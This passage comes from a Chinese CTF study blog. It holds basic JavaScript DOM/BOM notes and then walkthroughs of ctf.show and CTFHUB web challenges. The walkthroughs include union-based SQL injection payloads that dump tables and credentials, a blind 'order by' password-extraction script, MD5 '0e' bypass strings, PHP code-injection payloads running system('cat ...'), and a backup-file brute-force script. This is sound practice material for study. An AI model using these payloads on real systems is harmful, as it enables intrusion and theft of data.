language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;intro&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">       x.<span class="property">innerHTML</span>=<span class="string">&#x27;HELLO WORLD!&#x27;</span>; </span></span><br><span class="line"><span class="language-javascript">       </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>将元素该为框架iframe框架</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;id&quot;</span>).<span class="property">innerHTML</span>=<span class="string">&quot;&lt;ifream src=&#x27;https://kingwempity.github.io/&#x27;&gt;&lt;/ifream&gt;&quot;</span></span><br></pre></td></tr></table></figure>

<p>动态创建HTML内容</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="title class_">Date</span>());<span class="comment">//向页面中写入当前时间</span></span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;ifrema src=&#x27;https://kingwempity.github.io/&#x27;&gt;&lt;/ifrema&gt;&quot;</span>)<span class="comment">//向页面中写入框架</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>示例</p>
<blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">title</span>&gt;</span>kinwempity<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">P</span> <span class="attr">id</span>=<span class="string">&quot;intro&quot;</span>&gt;</span></span><br><span class="line">         Hello!敬请T期待</span><br><span class="line">     <span class="tag">&lt;/<span class="name">P</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">     	<span class="keyword">function</span> <span class="title function_">changetext</span>(<span class="params">id</span>)</span></span><br><span class="line"><span class="language-javascript">         &#123;</span></span><br><span class="line"><span class="language-javascript">             id.<span class="property">innerHTML</span>=<span class="string">&quot;Kingwempity@敬请T期待&quot;</span>;<span class="comment">//点击后变化的内容</span></span></span><br><span class="line"><span class="language-javascript">         &#125;</span></span><br><span class="line"><span class="language-javascript">     </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">h1</span> <span class="attr">onclick</span>=<span class="string">&quot;changetext(this)&quot;</span>&gt;</span></span><br><span class="line">         点我会发生变化o_o哦！</span><br><span class="line">     <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="BOM"><a href="#BOM" class="headerlink" title="BOM"></a>BOM</h3><blockquote>
<p>BOM:浏览器对象模型(Browser Object Model)</p>
</blockquote>
<blockquote>
<p>让浏览器来警告用户:</p>
<p>警告弹窗alert()</p>
<p>确认弹窗confirm()</p>
<p>提示弹窗prompt()</p>
<p>以上弹窗常用于简单的调试和信息展示。例如XSS漏洞测试</p>
</blockquote>
<blockquote>
<p>获取用户cookie（通常为浏览器发给用户客户端的一小段文本信息）</p>
<blockquote>
<p>常见场景：</p>
<p>用户输入用户名和密码成功登录网站后，网站会生成一个cookie给用户，当作用户凭证</p>
</blockquote>
<p>cookie一般在控制台的network或Application中可以查看</p>
<ul>
<li><p>获取Cookie</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span><span class="comment">//获取cookie</span></span><br></pre></td></tr></table></figure>


</li>
<li><p>修改写入Cookie</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">doucment.<span class="property">cookie</span>=<span class="string">&quot;写入值&quot;</span>#值的形式key=value</span><br></pre></td></tr></table></figure>


</li>
<li><p>显示cookie</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert(document.cookie)</span><br></pre></td></tr></table></figure></li>
</ul>
</blockquote>
<blockquote>
<p>获取浏览器屏幕信息</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="variable language_">window</span>.)screen</span><br></pre></td></tr></table></figure>



<p>获取&#x2F;控制用户页面的URL</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span><span class="comment">//获取当前页面url</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">location</span><span class="comment">//获取当前页面url</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;https://kingwempity.github.io/&quot;</span><span class="comment">//控制当前页面url</span></span><br></pre></td></tr></table></figure>



<p>获取访问者浏览器信息</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="variable language_">window</span>.)navigator</span><br></pre></td></tr></table></figure>



<p>操作浏览器窗口</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&quot;https://kingwempity.github.io/&quot;</span>)<span class="comment">//打开页面</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">close</span>(<span class="string">&quot;https://kingwempity.github.io/&quot;</span>)<span class="comment">//关闭页面</span></span><br></pre></td></tr></table></figure>



</blockquote>
<p>敬请T期待！ </p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>CTF</tag>
        <tag>Web</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>ctf.show_web</title>
    <url>/2024/02/20/ctf-show-web/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">

<h2 id="CTF-show秀"><a href="#CTF-show秀" class="headerlink" title="CTF.show秀"></a>CTF.show秀</h2><h3 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web4_1.png" alt="ctf.show_web4_1"></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web4_2.png" alt="ctf.show_web4_2"></p>
<blockquote>
<p>一个文件包含漏洞题目,<strong>日志注入</strong></p>
</blockquote>
<blockquote>
<p><u>使用include()函数接收url参数,include()函数包含的文件会被执行,从而造成任意代码执行,或者配合伪协议获取敏感文件甚至getshell;</u></p>
<p>本题伪协议不起作用,我们可以通过日志注入进行任意命令执行,从而getshell</p>
</blockquote>
<h3 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web5_1.png" alt="ctf.show_web5_1"></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web5_2.png" alt="ctf.show_web5_2"></p>
<blockquote>
<p>传递两个参数,一个字符串,一个数字,并且两个参数的md5值必须相同,我们可以利用<strong>md5的0e漏洞进行绕过</strong></p>
<p>通过GET请求传递两个参数v1和v2,并且参数v1必须是纯字母字符串,参数v2必须是数字或者数字字符串,并且两个参数的md5值必须相等</p>
</blockquote>
<blockquote>
<p>0e绕过是指:0e开头的字符串在参与弱类型比较时,会被当做科学计数法,结果转换为0;</p>
</blockquote>
<blockquote>
<ul>
<li><strong>ctype_alpha()函数用于检测字符串中是否仅包含字母,是则返回true,否则返回false</strong></li>
<li><strong>is_numeric()函数用于检测变量是否为数字或数字字符串,是则返回true,否则返回false</strong></li>
</ul>
</blockquote>
<blockquote>
<p>两个md5值进行弱类型比较</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5(&#x27;QNKCDZO&#x27;) == md5(240610708)</span><br></pre></td></tr></table></figure>
</blockquote>
<p>MD5加密后会变成这个样子</p>
<blockquote>
<p>0e830400451993494058024219903391 &#x3D;&#x3D; 0e462097431906509019562988736854</p>
</blockquote>
<p>由于0e开头的字符串会转换为0,所以真正比较的过程会变成下面这样</p>
<blockquote>
<p>0&#x3D;&#x3D;0</p>
</blockquote>
<p>返回结果为true,也就是说0e开头的md5值进行弱类型比较时,结果相等</p>
</blockquote>
<p><em><strong><u>常用的MD5加密后以0E开头的有</u></strong></em></p>
<blockquote>
<p>​    QNKCDZO<br>​    240610708<br>​    byGcY<br>​    sonZ7y<br>​    aabg7XSs<br>​    aabC9RqS<br>​    s878926199a<br>​    s155964671a<br>​    s214587387a<br>​    s1091221200a</p>
</blockquote>
<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><blockquote>
<p>SQL联合注入</p>
</blockquote>
<blockquote>
<p>打开题目看见文章列表，随机点击，点第一个</p>
</blockquote>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_1.png" alt="ctfshow_web7_1"></p>
<blockquote>
<p>发现显示文章，本想搜索flag,发现没有，看见url中id&#x3D;1</p>
<p><strong><u>从url地址栏中可以看到,页面通过文章的id值来查询文章内容,我们可以考虑SQL注入漏洞</u></strong></p>
<p>首先判断注入点,输入以下payload,使SQL恒成立,发现显示文章成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1/**/and/**/1</span><br></pre></td></tr></table></figure>

<p>在输入以下payload,使SQL恒不成立,发现显示不出文章，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1/**/and/**/0</span><br></pre></td></tr></table></figure>

<p>由此可以判断页面存在SQL注入,注入点为<u><strong>数值型注入</strong></u>,页面中有显示位,可以尝试<u><strong>联合注入</strong></u>进行脱库</p>
</blockquote>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_2.png" alt="ctfshow_web7_2"></p>
<blockquote>
<p>先来判断显示位,此处id传一个**-1**,<strong>由于id通常不为负数,后端根据id查询不到内容</strong>,就只能展示联合查询的结果,从而帮助我们判断字段显示的位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,2,3#</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_3.png" alt="ctfshow_web7_3"></p>
<blockquote>
<p>判断数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,database(),3#</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_4.png" alt="ctfshow_web7_4"></p>
<blockquote>
<p>查看web数据库中的flag表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&quot;web7&quot;),3#</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_5.png" alt="ctfshow_web7_5"></p>
<blockquote>
<p>查看flag表中的flag字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&quot;flag&quot;),3#</span><br></pre></td></tr></table></figure>

<p>也可使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=&quot;web7&quot;/**/and/**/table_name=&quot;flag&quot;),3</span><br></pre></td></tr></table></figure>


</blockquote>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_6.png" alt="ctfshow_web7_6"></p>
<blockquote>
<p>查看目标FLAG</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/flag/**/from/**/flag),3#</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_7.png" alt="ctfshow_web7_7"></p>
<h3 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h3><blockquote>
<p>SQL联合注入，GET请求方式</p>
</blockquote>
<img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_1.png" alt="ctfshow_web14_1" style="zoom:80%;">

<blockquote>
<p>尝试输入c获取$url,发现输入555555、3333、6000000时间过于漫长，输入1、2、3发现输入3时输出并非@A@,而是@<a href="mailto:&#65;&#x40;&#x68;&#101;&#114;&#x65;&#x5f;&#49;&#115;&#x5f;&#121;&#x6f;&#117;&#x72;&#x5f;&#x66;&#49;&#x61;&#x67;&#46;&#x70;&#104;&#x70;">&#65;&#x40;&#x68;&#101;&#114;&#x65;&#x5f;&#49;&#115;&#x5f;&#121;&#x6f;&#117;&#x72;&#x5f;&#x66;&#49;&#x61;&#x67;&#46;&#x70;&#104;&#x70;</a>@A@，或许here_1s_your_f1ag.php里面就包含flag，查看here_1s_your_f1ag.php文件，发现查询页面，查看是否能进行SQL注入</p>
</blockquote>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_2.png" alt="ctfshow_web14_2"></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_3.png" alt="ctfshow_web14_3"></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_4.png" alt="ctfshow_web14_4"></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_5.png" alt="ctfshow_web14_5"></p>
<blockquote>
<p>通过以上判断该题为SQL注入，注入点为数值型注入, 页面有回显, 推荐使用联合注入</p>
</blockquote>
<blockquote>
<p><u><strong>获取当前使用的数据库(爆库）</strong></u></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/database()</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_6.png" alt="ctfshow_web14_6"></p>
<blockquote>
<p><u><strong>获取数据库中的表(爆表)</strong></u></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/group_concat(table_name)/**/from/**/information_schema.`tables`/**/where/**/table_schema=database()</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_7.png" alt="ctfshow_web14_7"></p>
<blockquote>
<p><u><strong>获取表中的字段(爆字段)</strong></u></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/group_concat(column_name)/**/from/**/information_schema.`columns`/**/where/**/table_name=&#x27;content&#x27;</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_8.png" alt="ctfshow_web14_8"></p>
<blockquote>
<p><u><strong>查询字段内容(查字段)</strong></u></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/group_concat(username,password)/**/from/**/content</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_9.png" alt="ctfshow_web14_9"></p>
<blockquote>
<p>flag不在这，它不讲武德了啊，看来flag不在这，回去看PHP代码，里面有一个Include(“secret.php”);或许真的flag就在里面</p>
</blockquote>
<blockquote>
<p>先访问一下 secret.php 文件, 可以正常访问, 没有报404, 说明这个文件确实存在, 而且就在根目录下, apache的默认网站根路径是 &#x2F;var&#x2F;www&#x2F;html, 我们试一下读这个文件的内容</p>
</blockquote>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_10.png" alt="ctfshow_web14_10"></p>
<blockquote>
<p>发现提示&#x2F;real_flag_is_here,查看地址，发现flag</p>
</blockquote>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_11.png" alt="ctfshow_web14_11"></p>
<h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>题目提示：“flag在指定用户的密码中”</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web1%E5%9B%B0%E9%9A%BE.png" alt="ctfshow_web1困难"></p>
<p>使用sql注入发现无法注入，看见登录框，可以尝试弱口令注入，爆破</p>
<p>本题使用dirmap爆破</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web1%E5%9B%B0%E9%9A%BE_3.png" alt="ctfshow_web1困难_3"></p>
<p>爆出一个www.,zip，访问<a href="https://5126510a-052d-4128-83d5-69c656e90f8f.challenge.ctf.show/www.zip%E5%B0%86%E5%85%B6%E4%B8%8B%E8%BD%BD%E8%87%B3%E6%9C%AC%E5%9C%B0%EF%BC%9B%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6%E5%A4%B9%EF%BC%8C%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6">https://5126510a-052d-4128-83d5-69c656e90f8f.challenge.ctf.show/www.zip将其下载至本地；打开文件夹，查看文件</a></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web1%E5%9B%B0%E9%9A%BE_4.png" alt="ctfshow_web1困难_4"></p>
<p>查看index.php以及login.php和reg.php，发现文件对sql常见注入做了限制和严格过滤，无法使用常规SQL注入。user_main.php像一个显示用户信息的页面。</p>
<p>返回登录界面，注册一个账号并登录，页面显示</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web1%E5%9B%B0%E9%9A%BE_2.png" alt="ctfshow_web1困难_2"></p>
<p>显示用户信息表，里面有已经注册的信息。</p>
<p>提示有一个flag_is_my_password,因此我们需要获取该用户的密码。</p>
<p>查看user_mian.php源码：</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web1%E5%9B%B0%E9%9A%BE_5.png" alt="ctfshow_web1困难_5"></p>
<p>关键代码为:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql=&quot;select * from user order by $order&quot;;</span><br><span class="line">$sql=&quot;select * from user order by id&quot;;</span><br></pre></td></tr></table></figure>

<p>大佬的解释是：可以利用order by 密码来猜测密码，这里需要用到大佬写的脚本</p>
<p>大佬一：<a href="https://blog.csdn.net/miuzzx/article/details/104514442">https://blog.csdn.net/miuzzx/article/details/104514442</a></p>
<p>大佬二：<a href="https://wp.ctf.show/d/23-ctfshow-web1">https://wp.ctf.show/d/23-ctfshow-web1</a>  </p>
<p>大佬三：<a href="https://www.cnblogs.com/endermanneer/p/18180926">https://www.cnblogs.com/endermanneer/p/18180926</a></p>
<p>大佬四：<a href="https://ctf.show/writeups/780843">https://ctf.show/writeups/780843</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#author 羽</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://8b2bc75f-04d5-460a-8825-f45b6819043a.challenge.ctf.show&quot;</span></span><br><span class="line">url1=url+<span class="string">&quot;/reg.php&quot;</span> <span class="comment">#注册页面</span></span><br><span class="line">url2=url+<span class="string">&quot;/login.php&quot;</span><span class="comment">#登录界面</span></span><br><span class="line">url3=url+<span class="string">&quot;/user_main.php?order=pwd&quot;</span> <span class="comment">#查询界面</span></span><br><span class="line">k=<span class="string">&quot;&quot;</span></span><br><span class="line">s=<span class="string">&quot;-.0123456789:abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;*&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="comment">#print(i)</span></span><br><span class="line">        l=<span class="string">&quot;&quot;</span></span><br><span class="line">        l=k+i</span><br><span class="line">        l2 = k+<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-<span class="number">1</span>)</span><br><span class="line">        data=&#123;<span class="string">&#x27;username&#x27;</span>:l,</span><br><span class="line">                    <span class="string">&#x27;email&#x27;</span>:<span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;nickname&#x27;</span>:<span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;password&#x27;</span>:l</span><br><span class="line">        &#125;</span><br><span class="line">        data2=&#123;<span class="string">&#x27;username&#x27;</span>:l,</span><br><span class="line">                      <span class="string">&#x27;password&#x27;</span>:l</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (l==<span class="string">&#x27;flag&#x27;</span>):</span><br><span class="line">            k=<span class="string">&#x27;flag&#x27;</span></span><br><span class="line">            <span class="built_in">print</span>(k)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        session = requests.session()</span><br><span class="line">        r1 = session.post(url1,data)</span><br><span class="line">        r2 = session.post(url2,data)</span><br><span class="line">        r3 = session.get(url3)</span><br><span class="line">        t = r3.text</span><br><span class="line">        <span class="comment">#print(l)</span></span><br><span class="line">        <span class="keyword">if</span> (t.find(<span class="string">&quot;&lt;td&gt;&quot;</span>+l+<span class="string">&quot;&lt;/td&gt;&quot;</span>)&gt;t.find(<span class="string">&quot;&lt;td&gt;flag@ctf.show&lt;/td&gt;&quot;</span>)):</span><br><span class="line">            k=l2</span><br><span class="line">            <span class="built_in">print</span>(k)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>该代码中url把https修改成立http,https运行显示报错，于是将其修改为http。</p>
<p>大佬的脚本通过一个很巧妙的方式来判断这些记录是在 flag 的上方还是下方：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (t.find(<span class="string">&quot;&lt;td&gt;&quot;</span>+l+<span class="string">&quot;&lt;/td&gt;&quot;</span>)&gt;t.find(<span class="string">&quot;&lt;td&gt;flag@ctf.show&lt;/td&gt;&quot;</span>)):<span class="comment">#推荐使用</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (t.index(<span class="string">&quot;&lt;td&gt;&quot;</span>+l+<span class="string">&quot;&lt;/td&gt;&quot;</span>)&gt;t.index(<span class="string">&quot;&lt;td&gt;flag@ctf.show&lt;/td&gt;&quot;</span>)):<span class="comment">#运行有报错</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>通过指定字符串 index 的值,值更大，就是在下方</p>
</blockquote>
<p>运行脚本，运行时间比较长,得到flag，显示的flag最后需要将”|“修改成”}“</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web1%E5%9B%B0%E9%9A%BE_6.png" alt="ctfshow_web1困难_6"></p>
<h3 id="Web-Codelnject"><a href="#Web-Codelnject" class="headerlink" title="Web_Codelnject"></a>Web_Codelnject</h3><p>可以使用闭合</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_Codeinject_1.png" alt="ctfshow_Codeinject_1"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1=1);system(<span class="string">&quot;cat /&quot;</span>         <span class="comment">#POST</span></span><br></pre></td></tr></table></figure>



<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_Codeinject_2.png" alt="ctfshow_Codeinject_2"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1=1);print_r(system(<span class="string">&quot;cat /000f1ag.txt&quot;</span>));//       <span class="comment">#POST</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1=1);system(<span class="string">&quot;cat /000f1ag.txt&quot;</span> 					  <span class="comment">#POST</span></span><br></pre></td></tr></table></figure>



<p><img src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_Codeinject_3.png" alt="ctfshow_Codeinject_3"></p>
<h2 id="CTFHUB"><a href="#CTFHUB" class="headerlink" title="CTFHUB"></a>CTFHUB</h2><h3 id="WEB-请求方式"><a href="#WEB-请求方式" class="headerlink" title="WEB_请求方式"></a><strong>WEB_请求方式</strong></h3><hr>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_1.png" alt="请求方式"></p>
<hr>
<p>用burpsuit抓包,重放，将GET改成<strong>CTFHUB</strong>，发送即可获得flag</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_1_1.png" alt="BURPSUIT"></p>
<p>falg</p>
<hr>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_1_2.png" alt="flag"></p>
<hr>
<h3 id="信息页面隐藏"><a href="#信息页面隐藏" class="headerlink" title="信息页面隐藏"></a>信息页面隐藏</h3><hr>
<img src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_2_1.png" alt="CTFHUB_WEB_2_1" style="zoom: 80%;">

<p>看见页面信息繁杂，flag可能就隐藏在页面中，火狐快捷键*<u><strong>Ctrl+f</strong></u>*快捷查找，输入flag找到FLAG。</p>
<hr>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_2_2.png" alt="CTFHUB_WEB_2_2"></p>
<hr>
<h3 id="备份文件下载——网站源码"><a href="#备份文件下载——网站源码" class="headerlink" title="备份文件下载——网站源码"></a>备份文件下载——网站源码</h3><p><strong>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</strong></p>
<hr>
<blockquote>
<h4 id="常见的网站源码备份文件后缀"><a href="#常见的网站源码备份文件后缀" class="headerlink" title="常见的网站源码备份文件后缀"></a>常见的网站源码备份文件后缀</h4><hr>
<ul>
<li>tar</li>
<li>tar.gz</li>
<li>zip</li>
<li>rar</li>
</ul>
<h4 id="常见的网站源码备份文件名"><a href="#常见的网站源码备份文件名" class="headerlink" title="常见的网站源码备份文件名"></a>常见的网站源码备份文件名</h4><hr>
<ul>
<li>web</li>
<li>website</li>
<li>backup</li>
<li>back</li>
<li>www</li>
<li>wwwroot</li>
<li>temp</li>
</ul>
</blockquote>
<img src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_3_1.png" alt="CTFHUB_WEB_3_1" style="zoom:50%;">

<p>文件下载，用python脚本，requests</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/&quot;</span></span><br><span class="line"></span><br><span class="line">li1=[<span class="string">&quot;web&quot;</span>,<span class="string">&quot;website&quot;</span>,<span class="string">&quot;backup&quot;</span>,<span class="string">&quot;back&quot;</span>,<span class="string">&quot;www&quot;</span>,<span class="string">&quot;wwwroot&quot;</span>,<span class="string">&quot;temp&quot;</span>]</span><br><span class="line">li2=[<span class="string">&quot; tar&quot;</span>,<span class="string">&quot;tar.gz&quot;</span>,<span class="string">&quot;zip&quot;</span>,<span class="string">&quot;rar&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> li1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> li2:</span><br><span class="line">        url_final = url +<span class="string">&quot;/&quot;</span>+i+<span class="string">&quot;.&quot;</span>+j</span><br><span class="line">        r=requests.get(url_final)</span><br><span class="line">        <span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;Response [404]&gt;//1</span><br><span class="line">&lt;Response [404]&gt;//2</span><br><span class="line">&lt;Response [404]&gt;//3</span><br><span class="line">&lt;Response [404]&gt;//4</span><br><span class="line">&lt;Response [404]&gt;//5</span><br><span class="line">&lt;Response [404]&gt;//6</span><br><span class="line">&lt;Response [404]&gt;//7</span><br><span class="line">&lt;Response [404]&gt;//8</span><br><span class="line">&lt;Response [404]&gt;//9</span><br><span class="line">&lt;Response [404]&gt;//10</span><br><span class="line">&lt;Response [404]&gt;//11</span><br><span class="line">&lt;Response [404]&gt;//12</span><br><span class="line">&lt;Response [404]&gt;//13</span><br><span class="line">&lt;Response [404]&gt;//14</span><br><span class="line">&lt;Response [404]&gt;//15</span><br><span class="line">&lt;Response [404]&gt;//16</span><br><span class="line">&lt;Response [404]&gt;//17</span><br><span class="line">&lt;Response [404]&gt;//18</span><br><span class="line">&lt;Response [200]&gt;//[200]19</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br></pre></td></tr></table></figure>

<p>得到备份文件”<a href="http://www.zip/">www.zip</a>“</p>
